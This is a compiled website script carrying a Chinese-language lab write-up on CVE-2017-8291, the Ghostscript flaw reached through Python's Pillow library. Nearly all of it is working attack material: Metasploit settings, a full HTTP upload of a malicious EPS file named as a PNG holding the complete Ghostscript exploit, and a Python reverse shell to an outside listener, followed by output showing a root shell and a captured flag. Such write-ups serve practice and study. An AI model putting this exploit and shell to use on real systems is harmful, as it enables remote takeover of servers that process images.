"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5472],{56558:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>u,frontMatter:()=>i,metadata:()=>r,toc:()=>f});const r=JSON.parse('{"id":"Independent-Environment/CVE/CVE-2017-8291/index","title":"CVE-2017-8291","description":"\u9776\u6807\u4ecb\u7ecd\uff1a","source":"@site/docs/Independent-Environment/CVE/CVE-2017-8291/index.md","sourceDirName":"Independent-Environment/CVE/CVE-2017-8291","slug":"/Independent-Environment/CVE/CVE-2017-8291/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2017-8291/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CVE/CVE-2017-8291/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"CVE-2017-12611","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2017-12611/"},"next":{"title":"CVE-2021-44228","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2021-44228/"}}');var s=t(74848),a=t(28453);const i={},o="CVE-2017-8291",c={},f=[{value:"\u5165\u53e3\u70b9",id:"\u5165\u53e3\u70b9",level:2}];function p(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"cve-2017-8291",children:"CVE-2017-8291"})}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"\u9776\u6807\u4ecb\u7ecd\uff1a"}),(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"Python\u4e2d\u5904\u7406\u56fe\u7247\u7684\u6a21\u5757PIL\uff08Pillow\uff09\uff0c\u56e0\u4e3a\u5176\u5185\u90e8\u8c03\u7528\u4e86GhostScript\u800c\u53d7\u5230GhostButt\u6f0f\u6d1e\uff08CVE-2017-8291\uff09\u7684\u5f71\u54cd\uff0c\u9020\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"CVE"}),"\n"]}),"\n"]})]}),"\n",(0,s.jsx)(n.h2,{id:"\u5165\u53e3\u70b9",children:"\u5165\u53e3\u70b9"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"http://e0e73c50-7392-42b3-9b5d-fc22a78e8cf2-488.cyberstrikelab.com:83/\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,s.jsx)(n.a,{href:"https://github.com/neargle/PIL-RCE-By-GhostButt",children:"neargle/PIL-RCE-By-GhostButt: Exploiting Python PIL Module Command Execution Vulnerability"})," \u590d\u73b0\u5373\u53ef"]}),"\n",(0,s.jsx)(n.p,{children:"\u6216\u8005\u76f4\u63a5\u501f\u52a9 Metasploit"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"msf > use exploit/unix/fileformat/ghostscript_type_confusion\n[*] No payload configured, defaulting to cmd/unix/php/meterpreter/reverse_tcp\nmsf exploit(unix/fileformat/ghostscript_type_confusion) > set lhost 8.***.***.180\nlhost => 8.129.29.180\nmsf exploit(unix/fileformat/ghostscript_type_confusion) > set lport 10001\nlport => 10001\nmsf exploit(unix/fileformat/ghostscript_type_confusion) > run \n[+] msf.eps stored at /home/randark/.msf4/local/msf.eps\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528 poc \u4e0a\u4f20\u5373\u53ef"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'POST / HTTP/1.1\nHost: e0e73c50-7392-42b3-9b5d-fc22a78e8cf2-488.cyberstrikelab.com:83\nContent-Length: 2336\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://e0e73c50-7392-42b3-9b5d-fc22a78e8cf2-488.cyberstrikelab.com:83\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryLkzYRNbx2tfqscN7\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://e0e73c50-7392-42b3-9b5d-fc22a78e8cf2-488.cyberstrikelab.com:83/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundaryLkzYRNbx2tfqscN7\nContent-Disposition: form-data; name="file"; filename="1.png"\nContent-Type: image/png\n\n%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: -0 -0 100 100\n\n\n/size_from  10000      def\n/size_step    500      def\n/size_to   65000      def\n/enlarge    1000      def\n\n%/bigarr 65000 array def\n\n0\nsize_from size_step size_to {\n    pop\n    1 add\n} for\n\n/buffercount exch def\n\n/buffersizes buffercount array def\n\n\n0\nsize_from size_step size_to {\n    buffersizes exch 2 index exch put\n    1 add\n} for\npop\n\n/buffers buffercount array def\n\n0 1 buffercount 1 sub {\n    /ind exch def\n    buffersizes ind get /cursize exch def\n    cursize string /curbuf exch def\n    buffers ind curbuf put\n    cursize 16 sub 1 cursize 1 sub {\n        curbuf exch 255 put\n    } for\n} for\n\n\n/buffersearchvars [0 0 0 0 0] def\n/sdevice [0] def\n\nenlarge array aload\n\n{\n    .eqproc\n    buffersearchvars 0 buffersearchvars 0 get 1 add put\n    buffersearchvars 1 0 put\n    buffersearchvars 2 0 put\n    buffercount {\n        buffers buffersearchvars 1 get get\n        buffersizes buffersearchvars 1 get get\n        16 sub get\n        254 le {\n            buffersearchvars 2 1 put\n            buffersearchvars 3 buffers buffersearchvars 1 get get put\n            buffersearchvars 4 buffersizes buffersearchvars 1 get get 16 sub put\n        } if\n        buffersearchvars 1 buffersearchvars 1 get 1 add put\n    } repeat\n\n    buffersearchvars 2 get 1 ge {\n        exit\n    } if\n    %(.) print\n} loop\n\n.eqproc\n.eqproc\n.eqproc\nsdevice 0\ncurrentdevice\nbuffersearchvars 3 get buffersearchvars 4 get 16#7e put\nbuffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put\nbuffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put\nput\n\n\nbuffersearchvars 0 get array aload\n\nsdevice 0 get\n16#3e8 0 put\n\nsdevice 0 get\n16#3b0 0 put\n\nsdevice 0 get\n16#3f0 0 put\n\n\ncurrentdevice null false mark /OutputFile (%pipe%python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.***.***.180",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\')\n.putdeviceparams\n1 true .outputpage\n.rsdparams\n%{ } loop\n0 0 .quit\n%asdf\n\n\n------WebKitFormBoundaryLkzYRNbx2tfqscN7--\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u56de\u663e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@jmt-projekt:~# nc -lvnp 10001\nListening on 0.0.0.0 10001\nConnection received on 211.137.105.42 13668\n# whoami\nwhoami\nroot\n# cat /tmp/flag.txt\ncat /tmp/flag.txt\ngo-flag{7b169dee-8836-482d-ba12-0611b5d8cef7}\n"})})]})}function u(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(p,{...e})}):p(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var r=t(96540);const s={},a=r.createContext(s);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);